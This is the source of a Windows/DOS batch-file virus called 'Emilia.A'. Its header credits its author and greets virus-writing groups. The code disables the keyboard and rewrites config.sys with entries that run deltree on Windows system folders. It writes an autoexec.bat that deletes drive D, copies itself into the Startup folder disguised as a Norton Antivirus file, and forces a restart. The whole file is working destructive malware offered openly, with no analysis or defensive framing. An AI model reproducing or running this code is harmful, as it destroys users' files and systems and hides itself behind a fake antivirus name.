   @echo Project - EmiliA
   @echo Creator - DVL
   @echo VirName - Emilia.A
   @echo Purpose - Created just 2 demonstrate that .bat virii r pretty
   @echo           cool, crypted or not, BATch language is not lame.
   @echo GreetZ  - AV - Kaspersky, F-Prot, BitDefender
   @echo           VX - SpTh, Ratty, _Adder_, Gotenks, NGL
   @echo           and ALL BATch virus creators.
   @echo Contact - dvl2003ro@yahoo.co.uk
   :: 3
   :: 2
   :: 1
   :: Virus is starting ...
   @echo off
   @c:\windows\rundll32.exe keyboard,disable
   @deltree/y c:\config.sys >nul
   @echo [menu] > c:\config.sys
   @echo menuitem=EmiliA >> c:\config.sys
   @echo menuitem=Windows >> c:\config.sys
   @echo. >> c:\config.sys
   @echo [EmiliA] >> c:\config.sys
   @echo buffers=1 >> c:\config.sys
   @echo files=1 >> c:\config.sys
   @echo lastdrive=A >> c:\config.sys
   @echo set windir=deltree/y c:\windows\system\*.* >> c:\config.sys
   @echo set path=deltree/y c:\windows\inf\*.* >> c:\config.sys
   @echo set winbootdir=deltree/y c:\windows\*.exe >> c:\config.sys
   @echo set tmp=A:\EmiliA >> c:\config.sys
   @echo set temp=A:\EmiliA >> c:\config.sys
   @echo set msg=@echo This is the SECOND .SYS-maleware, created by DVL, Project EmiliA >> c:\config.sys
   @echo. >> c:\config.sys
   @echo [Windows] >> c:\config.sys
   @echo buffers=1 >> c:\config.sys
   @echo files=1 >> c:\config.sys
   @echo lastdrive=B >> c:\config.sys
   @echo set windir=deltree/y c:\windows\system\*.* >> c:\config.sys
   @echo set path=deltree/y c:\windows\inf\*.* >> c:\config.sys
   @echo set winbootdir=deltree/y c:\windows\*.com >> c:\config.sys
   @echo set tmp=B:\EmiliA >> c:\config.sys
   @echo set temp=B:\EmiliA >> c:\config.sys
   @echo set msg=@echo This is the SECOND .SYS-maleware, created by DVL, Project EmiliA >> c:\config.sys
   @echo @echo off > c:\autoexec.bat
   @echo for %%a in (d:\) do deltree/y %%a >> c:\autoexec.bat
   @echo @echo Project Emilia by DVL >> c:\autoexec.bat
   @copy %0 c:\windows\startm~1\programs\startup\Peter_Norton_Antivirus_Professional_Edition_2003_Copyrighted_Edition_Since_1980.........................................................................................................................................bat >nul
   %windir%\RUNDLL32.EXE %windir%\SYSTEM\shell32.dll,SHExitWindowsEx  7
